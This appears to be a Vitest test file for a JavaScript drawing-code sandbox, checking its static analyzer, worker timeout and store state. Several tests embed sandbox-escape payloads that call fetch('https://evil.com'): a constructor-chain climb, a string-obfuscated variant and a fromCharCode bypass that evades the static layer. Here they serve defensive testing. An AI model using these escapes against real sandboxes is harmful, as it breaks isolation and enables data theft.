import { describe, it, expect, vi } from 'vitest';
import { useSandboxStore } from '../../store/sandboxStore';
import { analyzeCodeSafety } from '../../sandbox/static-analyzer';
import { SandboxedCodeExecutor, IWorkerAdapter } from '../../sandbox/sandboxed-code-executor';
import {
  PULSING_CIRCLE_CODE,
  RANDOM_PARTICLES_CODE,
  INFINITE_LOOP_CODE,
  MALICIOUS_SAMPLES,
} from '../../sandbox/sample-codes';
import { WorkerExecutePayload } from '../../sandbox/types';

describe('Sandbox Playground Modal & Integration (SandboxPlaygroundModal)', () => {
  describe('Modal Store State Management (useSandboxStore)', () => {
    it('initializes with isOpen: false', () => {
      expect(useSandboxStore.getState().isOpen).toBe(false);
    });

    it('opens modal on openModal()', () => {
      useSandboxStore.getState().openModal();
      expect(useSandboxStore.getState().isOpen).toBe(true);
    });

    it('closes modal on closeModal()', () => {
      useSandboxStore.getState().closeModal();
      expect(useSandboxStore.getState().isOpen).toBe(false);
    });

    it('toggles modal state on toggleModal()', () => {
      useSandboxStore.getState().toggleModal();
      expect(useSandboxStore.getState().isOpen).toBe(true);
      useSandboxStore.getState().toggleModal();
      expect(useSandboxStore.getState().isOpen).toBe(false);
    });
  });

  describe('5 Preset Handcrafted Codes Verification', () => {
    // Preset 1: Kode Normal
    it('Preset 1 ("Kode Normal") passes static analysis and is ACCEPTED', () => {
      const analysis = analyzeCodeSafety(PULSING_CIRCLE_CODE);
      expect(analysis.valid).toBe(true);
      expect(analysis.errors).toHaveLength(0);
    });

    // Preset 2: Kode Pakai Random
    it('Preset 2 ("Kode Pakai Random") passes static analysis and is ACCEPTED', () => {
      const analysis = analyzeCodeSafety(RANDOM_PARTICLES_CODE);
      expect(analysis.valid).toBe(true);
      expect(analysis.errors).toHaveLength(0);
    });

    // Preset 3: Kode Infinite Loop
    it('Preset 3 ("Kode Infinite Loop") passes static analysis but is REJECTED by timeout guard', async () => {
      const analysis = analyzeCodeSafety(INFINITE_LOOP_CODE);
      // It passes static analysis (no forbidden identifiers), but must be terminated by watchdog
      expect(analysis.valid).toBe(true);

      const terminateSpy = vi.fn();
      const executor = new SandboxedCodeExecutor({
        defaultTimeoutMs: 50,
        workerFactory: () => {
          const adapter: IWorkerAdapter = {
            onmessage: null,
            onerror: null,
            terminate: terminateSpy,
            postMessage: () => {
              // Simulates infinite loop: never returns
            },
          };
          return adapter;
        },
      });

      const result = await executor.executeFrame({
        code: INFINITE_LOOP_CODE,
        t: 0.5,
        width: 360,
        height: 360,
        timeoutMs: 50,
      });

      expect(result.success).toBe(false);
      expect(result.timedOut).toBe(true);
      expect(result.error).toContain('50ms');
      expect(terminateSpy).toHaveBeenCalled();

      executor.dispose();
    });

    // Preset 4: Kode Coba Akses window
    it('Preset 4 ("Kode Coba Akses window") is REJECTED by static analysis', () => {
      const analysis = analyzeCodeSafety(MALICIOUS_SAMPLES.windowAccessAttempt);
      expect(analysis.valid).toBe(false);
      expect(analysis.errors.some((e) => e.includes('window') || e.includes('location'))).toBe(true);
    });

    // Preset 5: Kode Coba Fetch
    it('Preset 5 ("Kode Coba Fetch") is REJECTED by static analysis', () => {
      const analysis = analyzeCodeSafety(MALICIOUS_SAMPLES.fetchAttempt);
      expect(analysis.valid).toBe(false);
      expect(analysis.errors.some((e) => e.includes('fetch'))).toBe(true);
    });

    // Preset 6: Kode Coba Bypass (Constructor Chain)
    it('Preset 6 ("Kode Coba Bypass (Constructor Chain)") is REJECTED by static analysis', () => {
      const code = 'this.constructor.constructor("return this")().fetch("https://evil.com");';
      const analysis = analyzeCodeSafety(code);
      expect(analysis.valid).toBe(false);
      expect(analysis.errors.some((e) => e.includes('constructor'))).toBe(true);
      expect(analysis.errors.some((e) => e.includes('fetch'))).toBe(true);
    });

    // Preset 7: Kode Coba Bypass (String Obfuscation)
    it('Preset 7 ("Kode Coba Bypass (String Obfuscation)") is REJECTED by static analysis due to bracket string concatenation', () => {
      const code = "const key = 'con' + 'struct' + 'or';\nthis[key][key]('return this')()['fe' + 'tch']('https://evil.com');";
      const analysis = analyzeCodeSafety(code);
      expect(analysis.valid).toBe(false);
      // It is caught by the bracket concatenation regex rule: ['fe' + 'tch']
      expect(analysis.errors.some((e) => e.includes('concatenation inside property lookup brackets'))).toBe(true);
    });

    it('verifies that even if static analysis were bypassed, strict mode runtime causes TypeError because this is undefined', () => {
      // In the sandboxed runner wrapper ("use strict"; ...), this is undefined when invoked as drawFrame(ctx, t, ...)
      const runner = new Function(
        'ctx',
        't',
        'width',
        'height',
        'opts',
        `"use strict";
        const key = 'con' + 'struct' + 'or';
        return this[key][key]('return this')()['fe' + 'tch']('https://evil.com');`
      );
      expect(() => runner({}, 0, 100, 100, {})).toThrow(TypeError);
    });

    // Preset 8: Kode Coba Bypass (Dynamic Discovery)
    it('Preset 8 ("Kode Coba Bypass (Dynamic Discovery)") evaluation in static analysis', () => {
      const code = `const proto = ({}).__proto__;
const names = Object.getOwnPropertyNames(proto);
const targetKey = names.find(function(n) { return n.length === 11 && n.charCodeAt(0) === 99; });
const g = ({})[targetKey][targetKey]('return this')();
const fnKey = ['f','e','t','c','h'].join('');
g[fnKey]('https://evil.com');`;

      const analysis = analyzeCodeSafety(code);
      // Let's inspect errors
      expect(analysis.valid).toBe(false);
      expect(analysis.errors).toContain("Forbidden identifier detected: '__proto__'. Direct access is prohibited.");
      expect(analysis.errors).toContain("Forbidden property access via dot notation: '.__proto__'.");
    });

    // Preset 9: Kode Coba Bypass (Lolos L1, Tertahan L2)
    it('Preset 9 ("Kode Coba Bypass (Lolos L1, Tertahan L2)") passes static analysis (L1) but fails at Worker runtime (L2)', () => {
      const code = `const p = Object.getPrototypeOf({});
const keys = Object.getOwnPropertyNames(p);
const cKey = keys.find(function(k) { return k.startsWith('c') && k.endsWith('r') && k.length === 11; });
const F = ({})[cKey][cKey];
const g = F('return this')();
const fKey = String.fromCharCode(102, 101, 116, 99, 104);
const fn = g[fKey];
if (typeof fn === 'function') {
  fn('https://evil.com');
} else {
  throw new Error('Layer 2 Block: target is ' + typeof fn);
}`;

      // 1. Passes Layer 1 Static Analysis 100%
      const analysis = analyzeCodeSafety(code);
      expect(analysis.valid).toBe(true);
      expect(analysis.errors).toHaveLength(0);

      // 2. Fails in Layer 2 Worker Runtime because fetch is neutralized to undefined
      const mockWorkerScope: Record<string, unknown> = {
        fetch: undefined, // neutralized by hardenWorkerGlobalScope
      };

      const fKey = String.fromCharCode(102, 101, 116, 99, 104);
      const fn = mockWorkerScope[fKey];

      expect(fn).toBeUndefined();
      expect(() => {
        if (typeof fn === 'function') {
          (fn as (url: string) => void)('https://evil.com');
        } else {
          throw new Error('Layer 2 Block: target is ' + typeof fn);
        }
      }).toThrow('Layer 2 Block: target is undefined');
    });

    it('verifies that even if static analysis were bypassed, strict mode makes this undefined and prevents constructor climbing', () => {
      const runner = new Function(
        '"use strict"; return (function() { return this.constructor.constructor("return this")(); })()'
      );
      expect(() => runner()).toThrow(TypeError);
    });
  });

  describe('Full Executor End-to-End Simulation with Presets', () => {
    it('successfully processes Preset 1 and Preset 2 through mock worker response', async () => {
      const executor = new SandboxedCodeExecutor({
        workerFactory: () => {
          const adapter: IWorkerAdapter = {
            onmessage: null,
            onerror: null,
            terminate: vi.fn(),
            postMessage: (payload: WorkerExecutePayload) => {
              setTimeout(() => {
                if (adapter.onmessage) {
                  adapter.onmessage({
                    data: {
                      type: 'SUCCESS',
                      id: payload.id,
                      executionTimeMs: 14,
                    },
                  });
                }
              }, 5);
            },
          };
          return adapter;
        },
      });

      // Run Preset 1
      const resNormal = await executor.executeFrame({
        code: PULSING_CIRCLE_CODE,
        t: 0.25,
        width: 360,
        height: 360,
      });
      expect(resNormal.success).toBe(true);
      expect(resNormal.timedOut).toBe(false);

      // Run Preset 2
      const resRandom = await executor.executeFrame({
        code: RANDOM_PARTICLES_CODE,
        t: 0.75,
        width: 360,
        height: 360,
        opts: { seed: 42 },
      });
      expect(resRandom.success).toBe(true);
      expect(resRandom.timedOut).toBe(false);

      // Run Preset 4 (window) - should immediately fail without worker execution
      const resWindow = await executor.executeFrame({
        code: MALICIOUS_SAMPLES.windowAccessAttempt,
        t: 0,
        width: 360,
        height: 360,
      });
      expect(resWindow.success).toBe(false);
      expect(resWindow.error).toContain('Security Policy Violation');

      // Run Preset 5 (fetch) - should immediately fail without worker execution
      const resFetch = await executor.executeFrame({
        code: MALICIOUS_SAMPLES.fetchAttempt,
        t: 0,
        width: 360,
        height: 360,
      });
      expect(resFetch.success).toBe(false);
      expect(resFetch.error).toContain('fetch');

      executor.dispose();
    });
  });
});
